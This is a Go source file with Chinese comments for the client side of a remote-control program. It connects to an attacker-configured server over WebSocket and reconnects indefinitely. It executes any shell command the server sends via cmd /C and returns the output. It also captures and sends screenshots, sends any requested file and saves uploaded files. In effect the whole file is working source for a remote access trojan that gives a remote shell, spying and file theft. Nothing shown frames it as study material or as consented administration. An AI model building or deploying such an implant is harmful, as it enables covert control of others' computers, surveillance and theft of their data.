package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"image/jpeg"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

const (
	maxRetryCount = 5
	retryInterval = 10 * time.Second
	pingInterval  = 10 * time.Second
	writeTimeout  = 15 * time.Second
	readTimeout   = 60 * time.Second
)

var (
	serverAddr string
	clientID   string
	conn       *websocket.Conn // 添加这行声明全局conn变量
	connMutex  sync.RWMutex
	writeMutex sync.Mutex // 新增全局写锁
)

func getConn() *websocket.Conn {
	connMutex.RLock()
	defer connMutex.RUnlock()
	return conn
}

// 在 setConn 中添加状态检查
func setConn(c *websocket.Conn) {
	connMutex.Lock()
	defer connMutex.Unlock()

	if conn != nil {
		// 先关闭旧连接再替换
		go func(old *websocket.Conn) {
			old.WriteControl(
				websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseGoingAway, "reconnecting"),
				time.Now().Add(writeTimeout),
			)
			old.Close()
		}(conn)
	}
	conn = c
}

type CommandMessage struct {
	Action  string `json:"action"`
	Command string `json:"command,omitempty"`
	Path    string `json:"path,omitempty"`
	Name    string `json:"name,omitempty"`
	Data    []byte `json:"data,omitempty"`
}

func executeCommand(cmdStr string) (string, error) {
	log.Printf("准备执行命令: %s", cmdStr) // 添加日志
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	// 处理cd命令
	if strings.HasPrefix(cmdStr, "cd ") {
		newDir := strings.TrimPrefix(cmdStr, "cd ")
		os.Chdir(newDir)
	}

	var cmd *exec.Cmd
	cmd = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	cmd.Env = append(os.Environ(), "PYTHONIOENCODING=utf-8") // 设置Python输出编码为UTF-8

	log.Printf("开始执行命令: %s", cmdStr) // 添加日志
	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			log.Println("命令执行超时") // 添加日志
			return "命令执行超时", errors.New("命令执行超时")
		}
		log.Printf("命令执行错误: %v", err) // 添加日志
		return string(output), fmt.Errorf("执行错误: %v", err)
	}
	return string(output), nil
}

func main() {
	flag.StringVar(&serverAddr, "server", "YOUR_SERVER_IP:8888", "服务器地址")
	flag.StringVar(&clientID, "id", "", "客户端ID (必须)")
	flag.Parse()

	if clientID == "" {
		rand.Seed(time.Now().UnixNano())
		clientID = fmt.Sprintf("client_%s_%d",
			time.Now().Format("20060102_150405"),
			rand.Intn(1000))
	}
	log.Printf("客户端启动 (ID: %s, 服务器: %s)", clientID, serverAddr)
	// 初始化无限重连循环
	for {
		if err := connectAndServe(); err != nil {
			log.Printf("连接中断: %v，%v后重试...", err, retryInterval)
			time.Sleep(retryInterval)
		}
	}
}

// 连接管理部分保持不变...

func connectAndServe() error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var newConn *websocket.Conn
	var err error
	retry := 0

	// 带重试的连接建立
	for {
		wsURL := "ws://" + serverAddr + "/ws?id=" + clientID
		log.Printf("尝试连接到: %s", wsURL)
		newConn, _, err = websocket.DefaultDialer.Dial(wsURL, nil)
		if err == nil {
			// 验证连接是否真正可用
			if err := verifyConnection(newConn); err != nil {
				log.Printf("连接验证失败: %v", err)
				newConn.Close()
				err = fmt.Errorf("连接验证失败: %v", err)
			} else {
				setConn(newConn) // 更新全局连接
				break
			}
		}

		if retry >= maxRetryCount {
			return err
		}
		log.Printf("第%d次连接失败: %v", retry+1, err)
		time.Sleep(retryInterval)
		retry++
	}
	defer setConn(nil) // 连接最终清理

	log.Printf("成功连接服务端 (ID: %s)", clientID)

	currentConn := getConn()
	currentConn.SetReadDeadline(time.Now().Add(readTimeout))
	currentConn.SetPongHandler(func(appData string) error {
		currentConn.SetReadDeadline(time.Now().Add(readTimeout))
		return nil
	})

	// 启动受控心跳协程
	go startHeartbeat(ctx)

	// 主服务循环
	for {
		currentConn := getConn()
		if currentConn == nil {
			return errors.New("连接丢失")
		}

		currentConn.SetReadDeadline(time.Now().Add(readTimeout))
		msgType, msg, err := currentConn.ReadMessage()
		if err != nil {
			log.Println("连接异常:", err)
			return err
		}

		if msgType == websocket.TextMessage {
			var msgData map[string]interface{}
			if err := json.Unmarshal(msg, &msgData); err == nil {
				if action, ok := msgData["action"].(string); ok && action == "ping" {
					log.Printf("收到客户端 %s 的连接验证ping", clientID)
					pongMsg := map[string]string{
						"action":    "pong",
						"timestamp": time.Now().Format(time.RFC3339),
					}
					pongBytes, _ := json.Marshal(pongMsg)
					currentConn.WriteMessage(websocket.TextMessage, pongBytes)
					continue
				}
			}
			log.Printf("收到消息: %s", string(msg)) // 添加日志，显示收到的消息
			var cmdMsg CommandMessage
			if err := json.Unmarshal(msg, &cmdMsg); err != nil {
				log.Println("消息解析失败:", err)
				continue
			}

			switch cmdMsg.Action {
			case "capture":
				log.Println("收到截图命令") // 添加日志
				if err := sendScreenshot(); err != nil {
					log.Println("发送失败:", err)
				}
			case "file":
				log.Printf("收到文件请求: %s", cmdMsg.Path)
				if err := sendFile(cmdMsg.Path); err != nil {
					log.Println("发送文件失败:", err)
				}
			case "upload":
				log.Printf("收到文件上传请求: %s", cmdMsg.Name)
				if err := saveFile(cmdMsg.Name, cmdMsg.Data); err != nil {
					log.Println("保存文件失败:", err)
					writeMutex.Lock()
					currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
					currentConn.WriteMessage(websocket.TextMessage, []byte(`{"error":"保存文件失败"}`))
					writeMutex.Unlock()
				} else {
					writeMutex.Lock()
					currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
					currentConn.WriteMessage(websocket.TextMessage, []byte(`{"status":"success"}`))
					writeMutex.Unlock()
				}
			case "execute":
				log.Printf("收到命令: %s", cmdMsg.Command) // 添加日志
				go func() {
					output, err := executeCommand(cmdMsg.Command)
					if err != nil {
						log.Printf("命令执行错误: %v", err) // 添加日志
					}
					log.Printf("命令执行完成，输出长度: %d", len(output)) // 添加日志

					writeMutex.Lock()
					defer writeMutex.Unlock()

					currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
					if err := currentConn.WriteMessage(websocket.TextMessage, []byte(output)); err != nil {
						log.Println("发送命令输出失败:", err)
					} else {
						log.Println("命令输出发送成功") // 添加日志
					}
				}()
			default:
				log.Printf("未知的命令类型: %s", cmdMsg.Action) // 添加日志
			}
		}
	}
}

func startHeartbeat(ctx context.Context) {
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentConn := getConn()
			if currentConn == nil {
				return
			}

			writeMutex.Lock() // 加写锁
			currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
			err := currentConn.WriteMessage(websocket.PingMessage, nil)
			writeMutex.Unlock() // 解锁

			if err != nil {
				log.Println("心跳失败:", err)
				setConn(nil)
				return
			}
		case <-ctx.Done():
			return
		}
	}
}

// 新版截图函数
func sendScreenshot() error {
	currentConn := getConn()
	if currentConn == nil {
		return errors.New("无有效连接")
	}

	// 截图操作...
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return fmt.Errorf("截图失败: %w", err)
	}

	buf := new(bytes.Buffer)
	if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 75}); err != nil {
		return fmt.Errorf("编码失败: %w", err)
	}

	writeMutex.Lock() // 加写锁
	defer writeMutex.Unlock()

	currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
	if err := currentConn.WriteMessage(websocket.BinaryMessage, buf.Bytes()); err != nil {
		return fmt.Errorf("发送失败: %w", err)
	}

	log.Printf("截图已发送 (大小: %.2fKB)", float64(buf.Len())/1024)
	return nil
}

// 新增 sendFile 函数
func sendFile(filePath string) error {
	currentConn := getConn()
	if currentConn == nil {
		return errors.New("无有效连接")
	}

	// 读取文件内容
	fileData, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	writeMutex.Lock()
	defer writeMutex.Unlock()

	currentConn.SetWriteDeadline(time.Now().Add(writeTimeout))
	if err := currentConn.WriteMessage(websocket.BinaryMessage, fileData); err != nil {
		return fmt.Errorf("发送文件失败: %w", err)
	}

	log.Printf("文件已发送 (大小: %.2fKB)", float64(len(fileData))/1024)
	return nil
}

// 新增 saveFile 函数
func saveFile(fileName string, data []byte) error {
	// 保存文件到当前目录
	if err := os.WriteFile(fileName, data, 0644); err != nil {
		return fmt.Errorf("保存文件失败: %w", err)
	}
	log.Printf("文件已保存: %s (%.2fKB)", fileName, float64(len(data))/1024)
	return nil
}

// 新增：验证连接是否真正可用
func verifyConnection(conn *websocket.Conn) error {
	// 设置较短的超时时间进行验证
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// 发送一个简单的文本消息来验证连接
	testMsg := []byte(`{"action":"ping","timestamp":"` + time.Now().Format(time.RFC3339) + `"}`)
	if err := conn.WriteMessage(websocket.TextMessage, testMsg); err != nil {
		return fmt.Errorf("连接测试失败: %v", err)
	}

	// 等待服务端的pong响应
	_, data, err := conn.ReadMessage()
	if err != nil {
		return fmt.Errorf("等待pong响应失败: %v", err)
	}

	// 验证响应是否为pong
	var response map[string]interface{}
	if err := json.Unmarshal(data, &response); err != nil {
		return fmt.Errorf("pong响应解析失败: %v", err)
	}

	if action, ok := response["action"].(string); !ok || action != "pong" {
		return fmt.Errorf("收到非pong响应: %s", string(data))
	}

	log.Printf("连接验证成功")
	return nil
}
